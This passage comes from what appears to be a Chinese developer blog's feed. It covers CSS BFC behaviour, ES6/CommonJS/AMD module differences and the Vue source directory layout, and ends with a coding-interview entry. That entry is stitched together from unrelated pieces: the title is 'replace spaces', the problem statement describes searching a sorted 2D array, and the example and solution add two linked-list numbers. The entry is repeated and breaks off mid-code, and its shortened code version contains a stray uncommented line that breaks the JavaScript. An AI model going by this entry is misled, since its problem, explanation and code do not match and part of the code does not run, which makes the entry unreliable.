的下边距和第二个 div 的上边距发生了重叠，所以两个盒子之间距离只有 100px，而不是 200px。</p><p>首先这不是 CSS 的 bug，我们可以理解为一种规范，<strong>如果想要避免外边距的重叠，可以将其放在不同的 BFC 容器中。</strong></p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>.container &#123;    overflow: hidden;&#125;p &#123;    width: 100px;    height: 100px;    background: lightblue;    margin: 100px;&#125;</code></pre></div><p>这时候，两个盒子边距就变成了 200px</p><p><img src="https://pic2.zhimg.com/80/v2-5b8d6e8b2b507352900c1ece00018855_720w.png" alt="img"></p><p><strong>2. BFC 可以包含浮动的元素（清除浮动）</strong></p><p>我们都知道，浮动的元素会脱离普通文档流，来看下下面一个例子</p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border: 1px solid #000;&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100px;height: 100px;background: #eee;float: left;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre></div><p><img src="https://pic4.zhimg.com/80/v2-371eb702274af831df909b2c55d6a14b_720w.png" alt="img"></p><p>由于容器内元素浮动，脱离了文档流，所以容器只剩下 2px 的边距高度。如果使触发容器的 BFC，那么容器将会包裹着浮动元素。</p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border: 1px solid #000;overflow: hidden&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100px;height: 100px;background: #eee;float: left;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre></div><p>效果如图：</p><p><img src="https://pic4.zhimg.com/80/v2-cc8365db5c9cc5ca003ce9afe88592e7_720w.png" alt="img"></p><p><strong>3. BFC 可以阻止元素被浮动元素覆盖</strong></p><p>先来看一个文字环绕效果：</p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 100px;width: 100px;float: left;background: lightblue&quot;</span>&gt;</span>我是一个左浮动的元素<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 200px; height: 200px;background: #eee&quot;</span>&gt;</span>我是一个没有设置浮动, 也没有触发 BFC 元素, width: 200px; height:200px; background: #eee;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre></div><p><img src="https://pic4.zhimg.com/80/v2-dd3e636d73682140bf4a781bcd6f576b_720w.png" alt="img"></p><p>这时候其实第二个元素有部分被浮动元素所覆盖，(但是文本信息不会被浮动元素所覆盖) 如果想避免元素被覆盖，可触第二个元素的 BFC 特性，在第二个元素中加入 <strong>overflow: hidden</strong>，就会变成：</p><p><img src="https://pic3.zhimg.com/80/v2-5ebd48f09fac875f0bd25823c76ba7fa_720w.png" alt="img"></p><p>这个方法可以用来实现两列自适应布局，效果不错，这时候左边的宽度固定，右边的内容自适应宽度(去掉上面右边内容的宽度)。</p>]]></content>
    
    
    <categories>
      
      <category>css</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>模块化✊</title>
    <link href="/hexo_blog/2021/09/12/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    <url>/hexo_blog/2021/09/12/%E6%A8%A1%E5%9D%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="模块化🔓"><a href="#模块化🔓" class="headerlink" title="模块化🔓"></a>模块化🔓</h1><p><img src="../../../../hexo/themes/fluid/source/img/tag13.webp"></p><h2 id="ES6-模块与-CommonJS-模块的差异"><a href="#ES6-模块与-CommonJS-模块的差异" class="headerlink" title="ES6 模块与 CommonJS 模块的差异"></a>ES6 模块与 CommonJS 模块的差异</h2><blockquote><p>在有 <code>Babel</code> 的情况下，我们可以直接使用 <code>ES6</code>的模块化</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// file a.js</span><span class="hljs-keyword">export</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>) </span>&#123;&#125;<span class="hljs-keyword">export</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>) </span>&#123;&#125;<span class="hljs-comment">// file b.js</span><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;<span class="hljs-keyword">import</span> &#123;a, b&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./a.js&#x27;</span><span class="hljs-keyword">import</span> XXX <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./b.js&#x27;</span></code></pre></div><p><strong>CommonJS</strong></p><blockquote><p><code>CommonJs</code> 是 <code>Node</code> 独有的规范，浏览器中使用就需要用到 <code>Browserify</code>解析了。</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// a.js</span><span class="hljs-built_in">module</span>.exports = &#123;    a: <span class="hljs-number">1</span>&#125;<span class="hljs-comment">// or</span><span class="hljs-built_in">exports</span>.a = <span class="hljs-number">1</span><span class="hljs-comment">// b.js</span><span class="hljs-keyword">var</span> <span class="hljs-built_in">module</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./a.js&#x27;</span>)<span class="hljs-built_in">module</span>.a <span class="hljs-comment">// -&gt; log 1</span></code></pre></div><blockquote><p>在上述代码中，<code>module.exports</code> 和 <code>exports</code> 很容易混淆，让我们来看看大致内部实现</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">var</span> <span class="hljs-built_in">module</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./a.js&#x27;</span>)<span class="hljs-built_in">module</span>.a<span class="hljs-comment">// 这里其实就是包装了一层立即执行函数，这样就不会污染全局变量了，</span><span class="hljs-comment">// 重要的是 module 这里，module 是 Node 独有的一个变量</span><span class="hljs-built_in">module</span>.exports = &#123;    a: <span class="hljs-number">1</span>&#125;<span class="hljs-comment">// 基本实现</span><span class="hljs-keyword">var</span> <span class="hljs-built_in">module</span> = &#123;  <span class="hljs-built_in">exports</span>: &#123;&#125; <span class="hljs-comment">// exports 就是个空对象</span>&#125;<span class="hljs-comment">// 这个是为什么 exports 和 module.exports 用法相似的原因</span><span class="hljs-keyword">var</span> <span class="hljs-built_in">exports</span> = <span class="hljs-built_in">module</span>.exports<span class="hljs-keyword">var</span> load = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-built_in">module</span></span>) </span>&#123;    <span class="hljs-comment">// 导出的东西</span>    <span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>    <span class="hljs-built_in">module</span>.exports = a    <span class="hljs-keyword">return</span> <span class="hljs-built_in">module</span>.exports&#125;;</code></pre></div><blockquote><p>再来说说 <code>module.exports</code> 和<code>exports</code>，用法其实是相似的，但是不能对 <code>exports</code> 直接赋值，不会有任何效果。</p></blockquote><blockquote><p>对于 <code>CommonJS</code> 和 <code>ES6</code> 中的模块化的两者区别是：</p></blockquote><ul><li>前者支持动态导入，也就是 <code>require($&#123;path&#125;/xx.js)</code>，后者目前不支持，但是已有提案,前者是同步导入，因为用于服务端，文件都在本地，同步导入即使卡住主线程影响也不大。</li><li>而后者是异步导入，因为用于浏览器，需要下载文件，如果也采用同步导入会对渲染有很大影响</li><li>前者在导出时都是值拷贝，就算导出的值变了，导入的值也不会改变，所以如果想更新值，必须重新导入一次。</li><li>但是后者采用实时绑定的方式，导入导出的值都指向同一个内存地址，所以导入值会跟随导出值变化</li><li>后者会编译成 <code>require/exports</code> 来执行的</li></ul><p><strong>AMD</strong></p><blockquote><p><code>AMD</code> 是由 <code>RequireJS</code> 提出的</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// AMD</span>define([<span class="hljs-string">&#x27;./a&#x27;</span>, <span class="hljs-string">&#x27;./b&#x27;</span>], <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) </span>&#123;    a.do()    b.do()&#125;)define(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-built_in">require</span>, <span class="hljs-built_in">exports</span>, <span class="hljs-built_in">module</span></span>) </span>&#123;       <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./a&#x27;</span>)      a.doSomething()       <span class="hljs-keyword">var</span> b = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./b&#x27;</span>)    b.doSomething()&#125;)</code></pre></div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h5 id="1-CommonJS-模块输出的是一个值的拷贝，ES6-模块输出的是值的引用。"><a href="#1-CommonJS-模块输出的是一个值的拷贝，ES6-模块输出的是值的引用。" class="headerlink" title="1. CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。"></a>1. CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。</h5><ul><li>CommonJS 模块输出的是值的拷贝，也就是说，一旦输出一个值，模块内部的变化就影响不到这个值。</li><li>ES6 模块的运行机制与 CommonJS 不一样。JS 引擎对脚本静态分析的时候，遇到模块加载命令<code>import</code>，就会生成一个只读引用。等到脚本真正执行时，再根据这个只读引用，到被加载的那个模块里面去取值。换句话说，ES6 的<code>import</code>有点像 Unix 系统的“符号连接”，原始值变了，<code>import</code>加载的值也会跟着变。因此，ES6 模块是动态引用，并且不会缓存值，模块里面的变量绑定其所在的模块。</li></ul><h5 id="2-CommonJS-模块是运行时加载，ES6-模块是编译时输出接口。"><a href="#2-CommonJS-模块是运行时加载，ES6-模块是编译时输出接口。" class="headerlink" title="2. CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。"></a>2. CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。</h5><ul><li>运行时加载: CommonJS 模块就是对象；即在输入时是先加载整个模块，生成一个对象，然后再从这个对象上面读取方法，这种加载称为“运行时加载”。</li><li>编译时加载: ES6 模块不是对象，而是通过 <code>export</code> 命令显式指定输出的代码，<code>import</code>时采用静态命令的形式。即在<code>import</code>时可以指定加载某个输出值，而不是加载整个模块，这种加载称为“编译时加载”。</li></ul><p>CommonJS 加载的是一个对象（即<code>module.exports</code>属性），该对象只有在脚本运行完才会生成。而 ES6 模块不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成。</p>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vue源码解读🍺</title>
    <link href="/hexo_blog/2021/09/10/vue%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/"/>
    <url>/hexo_blog/2021/09/10/vue%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="vue源码解读"><a href="#vue源码解读" class="headerlink" title="vue源码解读"></a>vue源码解读</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在深入学习vue，打算对源码做一些了解</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><div class="hljs code-wrapper"><pre><code class="hljs routeros">├── benchmarks                  性能、基准测试├── dist                        构建打包的输出目录├── examples                    案例目录├── flow                        flow 语法的类型声明├── packages                    一些额外的包，比如：负责服务端渲染的包 vue-server-renderer、配合 vue-loader 使用的的 vue-template-compiler，还有 weex 相关的│   ├── vue-server-renderer│   ├── vue-template-compiler│   ├── weex-template-compiler│   └── weex-vue-framework├── scripts                     所有的配置文件的存放位置，比如 rollup 的配置文件├── src                         vue 源码目录│   ├── compiler                编译器│   ├── core                    运行时的核心包│   │   ├── components          全局组件，比如 keep-alive│   │   ├── config.js           一些默认配置项│   │   ├── global-api          全局 API，比如熟悉的：Vue.use()、Vue.component() 等│   │   ├──<span class="hljs-built_in"> instance </span>           Vue 实例相关的，比如 Vue 构造函数就在这个目录下│   │   ├── observer            响应式原理│   │   ├── util                工具方法│   │   └── vdom                虚拟 DOM 相关，比如熟悉的 patch 算法就在这儿│   ├── platforms               平台相关的编译器代码│   │   ├── web│   │   └── weex│   ├──<span class="hljs-built_in"> server </span>                 服务端渲染相关├── test                        测试目录├── types                       TS 类型声明</code></pre></div><h3 id="源码学习方法"><a href="#源码学习方法" class="headerlink" title="源码学习方法"></a>源码学习方法</h3><h3 id="flow-类型检测"><a href="#flow-类型检测" class="headerlink" title="flow 类型检测"></a>flow 类型检测</h3><blockquote><p>​    Flow就是JavaScript的静态类型检查工具，作为脚本语言，他的灵活性</p><p>Flow支持原始数据类型，其中void对应js中的undefined</p><p>基本内型  boolean / number/  string  /null  /void</p><p>引用内型   Object / Array  /Function  /自定义Class</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>替换空格 🤺</title>
    <link href="/hexo_blog/2021/09/10/%E5%89%91%E6%8C%87offer-2/"/>
    <url>/hexo_blog/2021/09/10/%E5%89%91%E6%8C%87offer-2/</url>
    
    <content type="html"><![CDATA[<h4 id="题目：-2-替换空格"><a href="#题目：-2-替换空格" class="headerlink" title="题目：(2)替换空格"></a>题目：(2)替换空格</h4><p>在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p><p><strong>例子:</strong></p><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-string">(2</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">3</span><span class="hljs-string">)</span> <span class="hljs-string">+</span> <span class="hljs-string">(5</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">6</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span><span class="hljs-string">)</span><span class="hljs-attr">Output:</span> <span class="hljs-number">7</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">0</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">8</span><span class="hljs-attr">Explanation:</span> <span class="hljs-number">342</span> <span class="hljs-string">+</span> <span class="hljs-number">465</span> <span class="hljs-string">=</span> <span class="hljs-number">807</span><span class="hljs-string">.</span></code></pre></div><p><strong>解决:</strong> </p><h6 id="▉-算法思路："><a href="#▉-算法思路：" class="headerlink" title="▉ 算法思路："></a>▉ 算法思路：</h6><blockquote><p>1）观察先知道空格的位置。</p><p>2）多位数加多位数，反转链表转化整数，如果整数相加，可能会溢出，此方法行不通。</p><p>3）直接进行位数运算，两链表每取出一个就做运算，将结果放入到新链表中。</p></blockquote><h6 id="▉-步骤："><a href="#▉-步骤：" class="headerlink" title="▉ 步骤："></a>▉ 步骤：</h6><blockquote><p>1）遍历链表之前，要定义一个哨兵结点、临时结点、存储计算结果的结点、进位标志；</p><p>2）开始遍历数据，判断当前结点是否为 null，为 null 就用 0 代替，否则取出数值；</p><p>3）求和（加 carray 进位），判断是否进位？记录进位值；</p><p>4）求模取余，计算两位数的各位数存储到链表中，指针向后移动；</p><p>5）判断结点是否为 null，继续遍历（如果链表 l2 比 l1 短,没有下一结点只能返回本身下次处理当做 null 处理）</p><ol start="6"><li>退出 while 循环勿忘最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位，存放到链表最后</li></ol></blockquote><h6 id="▉-代码实现："><a href="#▉-代码实现：" class="headerlink" title="▉ 代码实现："></a>▉ 代码实现：</h6><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * 性能分析：</span><span class="hljs-comment"> * 1)遍历整个链表，时间复杂度为 O（n）。</span><span class="hljs-comment"> * 2)需要额外的 n 大小的空间存储 计算结果结点，空间复杂度为 O(n)。</span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> addTwoNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) </span>&#123;    <span class="hljs-comment">//定义哨兵结点</span>    <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-string">&quot;head&quot;</span>);    <span class="hljs-keyword">let</span> current = head;<span class="hljs-comment">//临时指针</span>    <span class="hljs-comment">//存储计算后的链表</span>    <span class="hljs-keyword">let</span> sumNode = head;    <span class="hljs-comment">//定义进位变量</span>    <span class="hljs-keyword">let</span> carray = <span class="hljs-number">0</span>;    <span class="hljs-comment">//开始遍历两个链表取数据，判断链表是否为 null</span>    <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span> || l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-comment">//判断取数据的链表是否为nulL,为 null 就用 0 替换</span>        <span class="hljs-keyword">let</span> num1 = <span class="hljs-number">0</span>;        <span class="hljs-keyword">let</span> num2 = <span class="hljs-number">0</span>;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l1 == <span class="hljs-literal">null</span></span>)</span>&#123;            num1 = <span class="hljs-number">0</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            num1 = l1.val;        &#125;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l2 == <span class="hljs-literal">null</span></span>)</span>&#123;            num2 = <span class="hljs-number">0</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            num2 = l2.val;        &#125;        <span class="hljs-comment">// let num1 = l1 == null ? 0 : l1.val;</span>        <span class="hljs-comment">// let num2 = l2 == null ? 0 : l2.val;</span>        <span class="hljs-comment">//计算取出的两个数值的和用于判断是否满进位，如果满 10,carray 需要记录进位,默认为 0</span>        <span class="hljs-keyword">let</span> sum = num1 + num2 + carray;        <span class="hljs-comment">//判断是否需要存储进位值 1</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">sum &gt; <span class="hljs-number">9</span></span>)</span>&#123;           carray = <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            carray = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-comment">//carray = sum &gt; 9 ? 1 : 0;</span>        <span class="hljs-comment">//将两数之和相加[取模(取余运算)]添加到 sumNode 新链表中,一次排列</span>        current.next = <span class="hljs-keyword">new</span> ListNode(sum % <span class="hljs-number">10</span>)        <span class="hljs-comment">//将指针指向下一链表结点</span>        current = current.next;        <span class="hljs-comment">//继续遍历链表中的数据，判断下一结点是否为 null</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span></span>)</span>&#123;            l1 = l1.next;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-comment">//如果链表 l1 比 l2 短,没有下一结点只能返回本身下次处理当做 null 处理</span>            l1 = l1;        &#125;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;            l2 = l2.next;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-comment">//如果链表 l2 比 l1 短,没有下一结点只能返回本身下次处理当做 null 处理</span>            l2 = l2;        &#125;        <span class="hljs-comment">// l1 为不为 null 才满足条件</span>        <span class="hljs-comment">// l1 = l1 ? l1.next : l1;</span>        <span class="hljs-comment">// l2 = l2 ? l2.next : l2;</span>    &#125;    <span class="hljs-comment">//最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位</span>    <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">carray === <span class="hljs-number">1</span></span>)</span>&#123;        <span class="hljs-comment">//有哨兵的，所以需要 next 才能存放下一结点</span>        current.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-comment">//返回哨兵结点之后的链表</span>    <span class="hljs-keyword">return</span> head.next;&#125;</code></pre></div><h6 id="▉-代码缩减"><a href="#▉-代码缩减" class="headerlink" title="▉ 代码缩减:"></a>▉ 代码缩减:</h6><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> addTwoNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) </span>&#123;    <span class="hljs-comment">//定义哨兵结点</span>    <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-string">&quot;head&quot;</span>);    <span class="hljs-keyword">let</span> current = head;<span class="hljs-comment">//临时指针</span>    <span class="hljs-comment">//存储计算后的链表</span>    <span class="hljs-keyword">let</span> sumNode = head;    <span class="hljs-comment">//定义进位变量</span>    <span class="hljs-keyword">let</span> carray = <span class="hljs-number">0</span>;    <span class="hljs-comment">//开始遍历两个链表取数据，判断链表是否为 null</span>    <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span> || l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-comment">//判断取数据的链表是否为nulL,为 null 就用 0 替换</span>        <span class="hljs-keyword">let</span> num1 = l1 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l1.val;        <span class="hljs-keyword">let</span> num2 = l2 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l2.val;        <span class="hljs-comment">//计算取出的两个数值的和用于判断是否满进位，如果满 10,carray 需要记录进位,默认为 0</span>        <span class="hljs-keyword">let</span> sum = num1 + num2 + carray;        <span class="hljs-comment">//判断是否需要存储进位值 1</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">sum &gt; <span class="hljs-number">9</span></span>)</span>&#123;           carray = <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            carray = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-comment">//carray = sum &gt; 9 ? 1 : 0;</span>        <span class="hljs-comment">//将两数之和相加[取模(取余运算)]添加到 sumNode 新链表中,一次排列</span>        current.next = <span class="hljs-keyword">new</span> ListNode(sum % <span class="hljs-number">10</span>)        <span class="hljs-comment">//将指针指向下一链表结点</span>        current = current.next;        <span class="hljs-comment">//继续遍历链表中的数据，判断下一结点是否为 null</span>        l1 为不为 <span class="hljs-literal">null</span> 才满足条件        l1 = l1 ? l1.next : l1;        l2 = l2 ? l2.next : l2;    &#125;    <span class="hljs-comment">//最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位</span>    <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">carray === <span class="hljs-number">1</span></span>)</span>&#123;        <span class="hljs-comment">//有哨兵的，所以需要 next 才能存放下一结点</span>        current.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-comment">//返回哨兵结点之后的链表</span>    <span class="hljs-keyword">return</span> head.next;&#125;</code></pre></div><h6 id="▉-总结：需要注意几点。"><a href="#▉-总结：需要注意几点。" class="headerlink" title="▉ 总结：需要注意几点。"></a>▉ 总结：需要注意几点。</h6><blockquote><p>1、<code> l1 = l1 ? l1.next : l1</code> 代表的是 l1 不等于 null 会去 l1.next 的值。</p><p>2、用到哨兵思想，所以注意当前的指针指向。</p><p>3、两位数取模运算。</p></blockquote><h6 id="▉-扩展："><a href="#▉-扩展：" class="headerlink" title="▉ 扩展："></a>▉ 扩展：</h6><blockquote><p>三位数怎么取得各个位置上的数字？（水仙花数）</p><p><strong>答：</strong></p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">//移动小数点向前一位，得到小数点后一位</span>个位：a = <span class="hljs-number">123</span> % <span class="hljs-number">10</span> = <span class="hljs-number">3</span><span class="hljs-comment">//移动小数点向前两位，得到小数点后两位，除以10取整</span>十位：b  = <span class="hljs-built_in">parseInt</span>((<span class="hljs-number">123</span> % <span class="hljs-number">100</span>) / <span class="hljs-number">10</span>)<span class="hljs-comment">//移动小数点向前三位，得到小数点后三位，除以100取整</span>百位:：c = <span class="hljs-built_in">parseInt</span>((<span class="hljs-number">123</span> % <span class="hljs-number">1000</span>) / <span class="hljs-number">100</span>)<span class="hljs-comment">//依次类推.....</span></code></pre></div><p>在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p><p><strong>例子:</strong></p><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-string">(2</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">3</span><span class="hljs-string">)</span> <span class="hljs-string">+</span> <span class="hljs-string">(5</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">6</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span><span class="hljs-string">)</span><span class="hljs-attr">Output:</span> <span class="hljs-number">7</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">0</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">8</span><span class="hljs-attr">Explanation:</span> <span class="hljs-number">342</span> <span class="hljs-string">+</span> <span class="hljs-number">465</span> <span class="hljs-string">=</span> <span class="hljs-number">807</span><span class="hljs-string">.</span></code></pre></div><p><strong>解决:</strong> </p><h6 id="▉-算法思路：-1"><a href="#▉-算法思路：-1" class="headerlink" title="▉ 算法思路："></a>▉ 算法思路：</h6><blockquote><p>1）观察 Example 规律，关联到链表，用一个带头的链表存储。</p><p>2）多位数加多位数，反转链表转化整数，如果整数相加，可能会溢出，此方法行不通。</p><p>3）直接进行位数运算，两链表每取出一个就做运算，将结果放入到新链表中。</p></blockquote><h6 id="▉-临界条件："><a href="#▉-临界条件：" class="headerlink" title="▉ 临界条件："></a>▉ 临界条件：</h6><blockquote><p>1）一个链表比另一个链表长；</p><p>2）其中一个链表为 null。</p><p>3）求和运算会出现额外的进位（一般进位与最高位进位两种情况）。</p></blockquote><h6 id="▉-步骤：-1"><a href="#▉-步骤：-1" class="headerlink" title="▉ 步骤："></a>▉ 步骤：</h6><blockquote><p>1）遍历链表之前，要定义一个哨兵结点、临时结点、存储计算结果的结点、进位标志；</p><p>2）开始遍历数据，判断当前结点是否为 null，为 null 就用 0 代替，否则取出数值；</p><p>3）求和（加 carray 进位），判断是否进位？记录进位值；</p><p>4）求模取余，计算两位数的各位数存储到链表中，指针向后移动；</p><p>5）判断结点是否为 null，继续遍历（如果链表 l2 比 l1 短,没有下一结点只能返回本身下次处理当做 null 处理）</p><ol start="6"><li>退出 while 循环勿忘最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位，存放到链表最后</li></ol></blockquote><h6 id="▉-代码实现：-1"><a href="#▉-代码实现：-1" class="headerlink" title="▉ 代码实现："></a>▉ 代码实现：</h6><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * 性能分析：</span><span class="hljs-comment"> * 1)遍历整个链表，时间复杂度为 O（n）。</span><span class="hljs-comment"> * 2)需要额外的 n 大小的空间存储 计算结果结点，空间复杂度为 O(n)。</span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> addTwoNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) </span>&#123;    <span class="hljs-comment">//定义哨兵结点</span>    <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-string">&quot;head&quot;</span>);    <span class="hljs-keyword">let</span> current = head;<span class="hljs-comment">//临时指针</span>    <span class="hljs-comment">//存储计算后的链表</span>    <span class="hljs-keyword">let</span> sumNode = head;    <span class="hljs-comment">//定义进位变量</span>    <span class="hljs-keyword">let</span> carray = <span class="hljs-number">0</span>;    <span class="hljs-comment">//开始遍历两个链表取数据，判断链表是否为 null</span>    <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span> || l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-comment">//判断取数据的链表是否为nulL,为 null 就用 0 替换</span>        <span class="hljs-keyword">let</span> num1 = <span 